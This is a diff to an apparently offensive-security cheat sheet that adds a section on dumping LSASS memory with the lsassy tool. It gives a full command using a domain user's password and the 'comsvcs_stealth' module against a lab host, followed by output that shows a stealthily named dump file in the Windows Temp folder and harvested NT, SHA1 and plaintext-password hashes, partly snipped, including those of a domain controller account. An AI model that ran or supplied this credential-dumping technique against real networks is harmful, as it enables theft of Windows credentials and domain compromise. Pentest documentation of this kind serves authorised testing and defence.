@@ -101,6 +101,21 @@ $ lsassy -d <domain> -u '<domain-admin>or<local-admin>' -p '<password>' 10.10.10
 [+] [10.10.10.12] offsec.nl\el.prof   NietWelkom
 ```
 
+#### Dump lsass with module
+
+```plain
+$ lsassy -d offsec.nl -u john.do -p 'Welkom1234' 10.10.10.10 -m comsvcs_stealth
+[+] 10.10.10.10 Authentication successful
+[+] 10.10.10.10 Comsvcs.dll successfuly copied
+[+] 10.10.10.10 Lsass dumped in C:\Windows\Temp\R0fDNwVOq.ttf (215340545 Bytes)
+[+] 10.10.10.10 Lsass dump deleted
+[+] 10.10.10.10 OFFSEC\adm_johndo           [NT] 80a2cc87940725[...SNIP...]562de29 | [SHA1] c58e8057[...SNIP...]5df5c7d8a10afe5d
+[+] 10.10.10.10 OFFSEC\PDC01$    [NT] cb381530[...SNIP...]45ee76 | [SHA1] e16078f9f6939f0[...SNIP...]93156b55db
+[+] 10.10.10.10 offsec.nl\PDC01$  [PWD] d52be466975b3728c2acc13d9a7422a7b10[...SNIP...]e0a7795122cb2ee55537
+[+] 10.10.10.10 OFFSEC\PDC01$    [NT] 9e333[...SNIP...]9b27607fc | [SHA1] 3b8152bd[...SNIP...]2255e3ea72c
+[+] 10.10.10.10 offsec.nl\PDC01$  [PWD] c1e3cebd8f9628c752b34ca1290d8771cb159fedb2298219f7[...SNIP...]28bc2fe4ddc56b0e98a019bb072
+```
+
 ### URL list
 
 * [GitHub.com - lsassy](https://github.com/Hackndo/lsassy)
